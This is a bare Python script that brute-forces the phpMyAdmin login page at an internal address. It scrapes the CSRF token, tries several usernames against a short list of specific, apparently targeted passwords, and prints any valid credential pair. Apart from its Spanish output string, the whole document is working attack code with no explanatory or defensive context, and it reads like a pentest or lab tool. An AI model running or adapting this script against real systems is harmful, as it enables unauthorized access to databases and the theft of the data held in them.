import urllib.request, urllib.parse, http.cookiejar, re

url = 'http://10.10.30.11/phpmyadmin/'
users = ['pma', 'root', 'admin']
passwords = ['pma123', 'R00t-Maria!', 'Nexora#Admin2024']

for user in users:
    for pwd in passwords:
        try:
            jar = http.cookiejar.CookieJar()
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(jar))
            resp = opener.open(url + 'index.php').read().decode()
            token = re.search(
                r'token["\s:]+([a-f0-9]{32})', resp).group(1)
            data = urllib.parse.urlencode({
                'pma_username': user,
                'pma_password': pwd,
                'server': '1',
                'token': token
            }).encode()
            resp2 = opener.open(
                url + 'index.php', data).read().decode()
            if 'logged_in:true' in resp2:
                print(f'[+] CREDENCIALES VALIDAS: {user}/{pwd}')
        except:
            pass